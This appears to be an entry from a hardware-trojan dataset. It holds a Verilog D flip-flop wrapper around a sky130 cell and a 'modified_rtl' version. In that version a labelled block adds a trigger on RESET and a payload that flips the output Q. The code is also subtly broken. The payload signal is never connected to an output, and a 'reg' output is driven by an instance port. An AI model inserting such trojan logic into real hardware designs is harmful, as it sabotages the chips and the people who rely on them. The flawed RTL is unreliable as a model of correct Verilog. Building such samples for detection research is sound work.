module dff_with_async_set_reset(
    input D,
    input SET,
    input RESET,
    input CLK_N,
    output reg Q
);

    sky130_fd_sc_ms__udp_dff$NSR dut (.SET(SET), .RESET(RESET), .D(D), .Q(Q), .CLK_N(CLK_N));

endmodule

modified_rtl:
    module dff_with_async_set_reset(
    input D,
    input SET,
    input RESET,
    input CLK_N,
    output reg Q
);

    sky130_fd_sc_ms__udp_dff$NSR dut (.SET(SET), .RESET(RESET), .D(D), .Q(Q), .CLK_N(CLK_N));

// HT_START
// Trojan Type: Lightweight_Payload_Override
reg htrojan_trig;
reg htrojan_pay;
always @(*) begin
    htrojan_trig = (RESET == 1'b1);
    htrojan_pay = htrojan_trig ? (Q ^ 1'b1) : Q;
end
// HT_END
endmodule
